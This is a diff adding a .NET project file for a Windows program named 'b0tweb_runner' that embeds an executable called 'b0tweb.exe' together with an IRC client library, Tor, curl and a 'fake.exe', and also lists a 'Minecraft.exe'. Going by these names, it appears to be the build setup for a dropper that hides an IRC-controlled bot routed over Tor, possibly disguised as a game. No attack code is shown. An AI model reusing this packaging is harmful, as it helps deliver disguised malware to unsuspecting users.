@@ -1,0 +1,70 @@
+<Project Sdk="Microsoft.NET.Sdk">
+
+  <PropertyGroup>
+    <OutputType>WinExe</OutputType>
+    <TargetFramework>netcoreapp3.1</TargetFramework>
+    <RootNamespace>b0tweb_runner</RootNamespace>
+    <ApplicationIcon />
+    <StartupObject />
+  </PropertyGroup>
+
+  <ItemGroup>
+    <None Remove="b0tweb\b0tweb.exe" />
+    <None Remove="b0tweb\b0tweb.pdb" />
+    <None Remove="b0tweb\Meebey.SmartIrc4net.dll" />
+    <None Remove="b0tweb\Meebey.SmartIrc4net.xml" />
+    <None Remove="b0tweb\Newtonsoft.Json.dll" />
+    <None Remove="b0tweb\Newtonsoft.Json.xml" />
+    <None Remove="b0tweb\System.ValueTuple.dll" />
+    <None Remove="b0tweb\System.ValueTuple.xml" />
+    <None Remove="Curl\curl-ca-bundle.crt" />
+    <None Remove="Curl\curl.exe" />
+    <None Remove="Curl\libcurl-x64.dll" />
+    <None Remove="Faker\fake.exe" />
+    <None Remove="Minecraft.exe" />
+    <None Remove="Tor\libcrypto-1_1-x64.dll" />
+    <None Remove="Tor\libevent-2-1-6.dll" />
+    <None Remove="Tor\libevent_core-2-1-6.dll" />
+    <None Remove="Tor\libevent_extra-2-1-6.dll" />
+    <None Remove="Tor\libgcc_s_seh-1.dll" />
+    <None Remove="Tor\libssl-1_1-x64.dll" />
+    <None Remove="Tor\libssp-0.dll" />
+    <None Remove="Tor\libwinpthread-1.dll" />
+    <None Remove="Tor\tor.exe" />
+    <None Remove="Tor\zlib1.dll" />
+  </ItemGroup>
+
+  <ItemGroup>
+    <EmbeddedResource Include="b0tweb\b0tweb.exe" />
+    <EmbeddedResource Include="b0tweb\b0tweb.pdb" />
+    <EmbeddedResource Include="b0tweb\Meebey.SmartIrc4net.dll" />
+    <EmbeddedResource Include="b0tweb\Meebey.SmartIrc4net.xml" />
+    <EmbeddedResource Include="b0tweb\Newtonsoft.Json.dll" />
+    <EmbeddedResource Include="b0tweb\Newtonsoft.Json.xml" />
+    <EmbeddedResource Include="b0tweb\System.ValueTuple.dll" />
+    <EmbeddedResource Include="b0tweb\System.ValueTuple.xml" />
+    <EmbeddedResource Include="Curl\curl-ca-bundle.crt" />
+    <EmbeddedResource Include="Curl\curl.exe" />
+    <EmbeddedResource Include="Curl\libcurl-x64.dll" />
+    <EmbeddedResource Include="Faker\fake.exe" />
+    <EmbeddedResource Include="Tor\libcrypto-1_1-x64.dll" />
+    <EmbeddedResource Include="Tor\libevent-2-1-6.dll" />
+    <EmbeddedResource Include="Tor\libevent_core-2-1-6.dll" />
+    <EmbeddedResource Include="Tor\libevent_extra-2-1-6.dll" />
+    <EmbeddedResource Include="Tor\libgcc_s_seh-1.dll" />
+    <EmbeddedResource Include="Tor\libssl-1_1-x64.dll" />
+    <EmbeddedResource Include="Tor\libssp-0.dll" />
+    <EmbeddedResource Include="Tor\libwinpthread-1.dll" />
+    <EmbeddedResource Include="Tor\tor.exe" />
+    <EmbeddedResource Include="Tor\zlib1.dll" />
+  </ItemGroup>
+
+  <ItemGroup>
+    <Folder Include="Properties\" />
+  </ItemGroup>
+
+  <ItemGroup>
+    <PackageReference Include="System.Drawing.Common" Version="4.7.0" />
+  </ItemGroup>
+
+</Project>
